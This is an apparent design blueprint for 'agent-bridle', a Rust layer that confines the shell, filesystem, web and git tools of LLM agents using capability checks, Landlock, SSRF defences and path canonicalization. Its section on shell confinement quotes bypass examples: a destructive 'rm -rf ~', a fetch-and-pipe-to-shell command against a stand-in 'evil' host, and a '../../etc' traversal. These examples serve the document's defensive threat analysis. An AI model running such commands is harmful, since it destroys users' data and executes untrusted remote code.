# agent-bridle — Design Blueprint

> Status: draft for sign-off (2026-06-02). Synthesized from a 3-architecture
> design panel + 3 adversarial judges (verified against brush 0.5 and
> agent-mesh-protocol source), then widened to the whole Gilamonster agent line.

## 1. Thesis

`agent-bridle` is the **shared tool + capability-enforcement layer** for the
Gilamonster agent line (newt, gilamonster, monitor/Monty, hermes-thoon). It
turns each host's hand-wired, ambient-authority tool surface into an extensible,
**capability-governed registry**. Every tool declares the authority it needs as
an `agent_mesh_protocol::Caveats` requirement; the registry refuses dispatch
unless `required ⊑ granted` under the meet-semilattice. The confused-deputy gap
(an LLM choosing tool arguments while holding full ambient authority) is closed
*structurally*, not by prompt hygiene.

- **brush** = the hands (a carried, batteries-included shell/coreutils runtime).
- **Caveats** = the leash (one canonical type, from agent-mesh-protocol).
- **bridle** = the enforcer that binds them — the first real *enforcer* of a
  lattice that is advisory in agent-mesh today.

## 2. Non-bypassable enforcement (the core invariant)

Two grafted ideas make the leash structural rather than conventional:

1. **`ToolContext` is a mint-token.** Its fields are private and it is
   constructible **only** inside `bridle-core`'s `Gate::authorize()`. A `Tool`
   receives a `ToolContext` to do anything. Therefore the only path to running a
   tool is `dispatch → gate.authorize → ToolContext`; a tool *cannot* run
   without having passed the leash. Enforcement by construction.

2. **Effective authority = `granted.meet(declared.required)`.** `authorize()`
   hands the tool the *meet* of what the session was granted and what the tool
   declared it needs — least-authority by construction. `meet` is a
   property-tested law (`meet_never_amplifies`), so this is provably safe.

```rust
// bridle-core (sketch)
pub struct ToolContext { caveats: Caveats, sandbox_kind: SandboxKind, /* private */ }

#[async_trait]
pub trait Tool: Send + Sync {
    fn name(&self) -> &str;
    fn schema(&self) -> serde_json::Value;       // MCP inputSchema
    fn required(&self) -> Caveats;               // authority this tool needs
    async fn invoke(&self, args: serde_json::Value, cx: &ToolContext)
        -> Result<serde_json::Value, ToolError>;
}

impl Gate {
    pub fn authorize(&self, tool: &dyn Tool, granted: &Caveats)
        -> Result<ToolContext, ToolError> {
        if !tool.required().leq(granted) { return Err(ToolError::Denied(/*…*/)); }
        let effective = granted.meet(&tool.required());      // least authority
        self.budget.charge_one()?;                           // max_calls
        self.check_generation(granted)?;                     // valid_for_generation
        Ok(ToolContext::mint(effective, self.sandbox_kind))  // ONLY mint site
    }
}
```

## 3. Crate layout (dependency isolation = the leanness win)

The single biggest verified leanness win: **heavy deps live in leaf tool crates
only**, never in `bridle-core` or the host's default build.

| Crate | Purpose | Heavy deps |
|---|---|---|
| `agent-bridle-core` | `Tool` trait, `Registry`, `Gate`, `Caveats` re-export, `Sandbox` trait, result envelope | **none** — `anyhow`, `serde`, `serde_json`, `async-trait`, `agent-mesh-protocol` only. No tokio, no brush. |
| `agent-bridle-tool-shell` | brush-backed confined shell (carried coreutils) | brush-core/builtins/coreutils-builtins (feature `shell`) |
| `agent-bridle-tool-web` | `web_fetch`/`http`/`web_search` | reqwest+rustls, readability/htmd (feature `web`) |
| `agent-bridle-tool-fs` | confined read/edit/search/list | (light) |
| `agent-bridle-tool-scm` | git tools (log/blame/diff/status/commit/branch/push/pull) | **`gix` (gitoxide)** — pure-Rust, on crates.io, **in-process** (feature `scm`). No heavy/private deps, no system `git`. |
| `agent-bridle-browse` | headless-browser tool | chromiumoxide / Playwright-MCP — **subprocess only, never baked** |
| `agent-bridle` (facade) | re-exports a registry the host consumes like newt-tools-scm | — |
| `agent-bridle-mcp` | MCP server frontend (binary) over the registry | — |
| `agent-bridle-py` | PyO3 wheel: Pillar A + the Python tool host/sidecar | pyo3 |

**The git tools are built on `gix` (gitoxide).** It's pure-Rust, crates.io-published,
in-process, and needs no system `git` — so CI just works, the crate can publish to
crates.io, and it carries git to Windows-with-just-a-filesystem the same way brush
carries the shell. The tool layer takes **no private path-dependencies and no heavy
columnar deps** (a private git-wrapper path dep plus `arrow-array` v58 broke an
earlier git-tools attempt in CI; `gix` avoids both). Validate `gix` write coverage
(commit/push/pull) at impl time — reads are solid. The default build pulls only
`gix` under the `scm` feature.

## 4. The three frontends (one core)

1. **In-proc Rust** — `agent_bridle::register(&mut server)` collapses
   newt-mcp-server's hand-maintained match to one call. Knock out = disable a
   cargo feature → leaner binary.
2. **`agent-bridle-mcp` server** — MCP is the lingua franca. **hermes-thoon is
   an MCP client** (`mcp_servers:` config) → zero-change adoption; newt-mcp-server
   already speaks MCP.
3. **Subprocess plugin** — runtime add/knock-out, zero binary cost; Caveats ship
   as the signed cert chain over a JSON-RPC stdio protocol. (2) and (3) converge:
   an MCP/JSON-RPC server process.

## 5. Registry: dual registration (verified hazard)

`inventory` auto-registration (one `register_tool!` line, zero host edits) is the
ergonomic default — **but** newt's release profile is `strip=true` + `lto=thin`
(verified), the real-world trigger for linker DCE silently dropping a
self-registered tool from `tools/list`. Mitigations (all required):

- Ship **explicit `Registry::manual()`/builder** as a first-class, supported
  alternative to `inventory`.
- Anchor each tool module's symbols with facade-crate `pub use`.
- A **presence test in CI** across the `--no-default-features` feature matrix
  asserting the expected tool set is registered.

## 6. brush confinement — the hard truth (verified)

The judges verified against brush 0.5 source that the naive in-process leash is
**not airtight**:

- **`exec` cannot be confined by cleared-PATH + builtin allow-list.** brush
  (`commands.rs:393-421`) bypasses PATH and the builtin table for any command
  containing a path separator: with `exec=Only{git}` and empty PATH,
  `/bin/rm -rf ~`, `./payload`, `../bin/curl evil|sh` all still execute.
- **No universal open-file hook.** `ShellExtensions` (`extensions.rs`) carries
  only `ErrorFormatter`; the `Stream` trait covers fds we *inject*, not arbitrary
  `>`/`<`/`source`/glob opens. So in-process `fs_read`/`fs_write` enforcement for
  free-form scripts is impossible as-is.
- **I/O capture via `Arc<Mutex<Vec<u8>>>` will not compile.** `openfiles::Stream`
  requires (unix) real `OwnedFd`/`BorrowedFd`. **Capture must use `os_pipe` /
  `PipeReader`+`PipeWriter` (or memfd) and drain it.**

**Resolution — two layers, and we own the fork:**

1. **Landlock is the authoritative boundary on Linux** (kernel-real). The Gate
   records `sandbox_kind` in **every** `ToolResult`, and the shell tool's
   exec/fs *guarantee* is **gated on Landlock being active**. Off-Linux the leash
   is documented as **advisory/best-effort** — no overclaiming.
2. **Add a `ShellExtensions` exec/open hook to `hartsock/brush`** (our fork) — a
   "before spawning argv0 / before opening path, ask bridle" callback. This makes
   in-process confinement real cross-OS. `agent-bridle-tool-shell` git-depends on
   the patched fork (intent to upstream). Until then, Linux+Landlock only.
- **Path scoping is canonicalized in the Gate** (`check_path`: realpath, reject
  symlinks escaping scope) *before* the membership check — never string-prefix
  matching — with Landlock as backstop. Closes the `@repo`/`../../etc` traversal.

## 7. Web tools = the `net` enforcer

Three independently-gated tiers (see also the `net` Caveat — the axis no other
tool exercises):

- **fetch** `web_fetch(url)`→markdown — in-proc Rust (`reqwest`+rustls +
  readability→`htmd`), **baked in**, carried, Windows-OK. (curlio is the tier-1
  reference for the raw `http` sub-tool; we use reqwest directly, async.)
- **search** — HTTP client carried; provider (SearXNG/Brave) is config.
- **browse** — headless Chrome / Playwright-MCP — **subprocess only**.

`net` enforcement (in-proc, since Landlock is port- not host-based): host
allowlist default-deny → resolve DNS (`hickory-dns`) + reject
private/loopback/link-local IPs (SSRF) + **pin the connection to the resolved IP**
(anti-rebinding TOCTOU) + re-check **every redirect hop** + `max_calls`/generation
bounds. Fetched content is **untrusted** → returned as structured data
`{url,final_url,status,title,markdown}`, never spliced into the system prompt.
Downloads to a file are gated by `fs_write`.

## 8. Python — two pillars (the gilabot vision, leashed)

- **A — use as a library:** `pip install agent-bridle` (PyO3). Reuse the SAME
  `Caveats` pyclass (now exposed via agent-mesh PR #18). `ab.invoke("shell",
  args, caveats=...)`.
- **B — ad-hoc plain-Python tools:** drop a `.py` with an `@tool` decorator into a
  **host-scoped tools dir** (`~/.newt/tools`, `~/.monty/tools`, `~/.gila/tools`,
  or `~/.agent-bridle/tools` standalone — like SKILLS, configurable per host).
  Discovered at runtime, reusing shared primitives (Caveats, envelope, fast
  fileops, brush shell). **Untrusted ad-hoc Python runs in a confined sidecar**
  (`python -m agent_bridle.host` loaded once, spawned under the Caveats +
  Landlock) so the leash is real at the syscall boundary; in-process embedded
  PyO3 is reserved for trusted tools + Pillar A.
- **Maturity pipeline:** prototype in Python → port hot tools to a Rust
  `agent-bridle-tool-*` crate → knock out. Same leash/envelope/registry across
  both. Python = breadth/prototyping; Rust = proven fast core.

## 9. Per-host fit

- **newt-agent** (opinionated, not extensible): bridle tools as feature-gated
  crates; `agent_bridle::register(...)` replaces the PR#125 hand-wired match;
  **supersede the unconfined `shell_run`**; migrate `newt-tools-scm` onto the
  registry (sanctioned). Tools dir `~/.newt/tools`.
- **gilamonster-agent** (organism): inherits transitively + can run
  `agent-bridle-mcp` to compose airframes. `~/.gila/tools`.
- **monitor-agent / Monty** (Prometheus insight agent): `web_fetch`/PromQL tools
  with `net` scoped to the Prom endpoint; insight synthesis stays Monty's LLM
  job. `~/.monty/tools`.
- **hermes-thoon** (Python, MCP client): add `agent-bridle-mcp` to
  `mcp_servers:`; bridle tools can sit on `thoon-*` primitives → speed + safety.

## 10. Prerequisites & decisions (RESOLVED 2026-06-02)

1. **agent-mesh dependency — RESOLVED via crates.io.** Re-verified directly:
   `agent-mesh-protocol` **0.6.0 IS published on crates.io** (with the Rust
   `Caveats` type) and `newt-agent-mesh` 0.6.0 is on PyPI — the panel judge's
   "not published" claim was stale. So `agent-bridle-core` depends on
   `agent-mesh-protocol = "0.6"` from crates.io directly; **P0 is unblocked**.
   PR #18 (Python `Caveats`) is NOT in 0.6.0 → it ships in **0.6.1**, which gates
   only the Python pillars (§8), not P0. Decision: publish agent-mesh **0.6.1**
   (merge #18 → bump → tag `v0.6.1` → release.yml publishes wheels+crates).
2. **brush exec/open hook — YES.** Implement a `ShellExtensions` exec/open hook
   in `hartsock/brush` (our fork), git-dep it from `agent-bridle-tool-shell`, and
   **contribute upstream**: file an issue on `reubeno/brush` explaining why
   capability-confined embedding needs the hook, then open a PR to upstream it if
   the author wants it. Until merged, Linux+Landlock is authoritative; off-Linux
   advisory (recorded in `sandbox_kind`).
3. **Registry default — explicit.** `Registry::builder()` explicit registration
   is the default (safe under newt's `strip+lto`); `inventory` is opt-in sugar
   guarded by a CI presence-test.

### agent-mesh release mechanism (for the 0.6.1 publish)
`release.yml` is **tag-triggered** (`v*`): builds wheels (linux+macOS, no
Windows), publishes to PyPI (trusted publishing/OIDC) + crates.io in dep order
(needs `CARGO_REGISTRY_TOKEN` secret — set, since 0.6.0 published). So 0.6.1 =
merge PR #18 → bump workspace version 0.6.0→0.6.1 → push tag `v0.6.1`.
**Publishing is irreversible/outward-facing → requires explicit go-ahead.**

## 11. Licensing & versioning

Apache-2.0 (brush MIT — carry its notice). Hold the 0.6.x line through June 2026;
lock-step workspace version.

## 12. Phase plan

- **P0** `agent-bridle-core` (Tool trait, Registry dual-mode, Gate w/
  mint-token + effective-meet, `Sandbox` trait, envelope) + `agent-bridle-tool-shell`
  (brush, os_pipe capture, Landlock on Linux) + a 2nd demo tool + tests proving
  the leash *denies* out-of-scope exec/fs/net. No newt changes.
- **P1** newt tool loop + adopt `agent_bridle::register` in newt-mcp-server +
  `~/.newt/tools`.
- **P2** migrate `newt-tools-scm`; retire unconfined `shell_run`; git as subprocess.
- **P3** Landlock + confined Python sidecar; canonicalizing `check_path`.
- **P4** `agent-bridle-mcp` + PyPI wheel (Pillars A & B); web tools.
- **P5** mesh-delegation demo (Desk mints attenuated AgentKey → worker enforces).
- **Upstream** brush `ShellExtensions` exec/open hook.

Prereq (done): agent-mesh Caveats exposed to Python — PR #18.
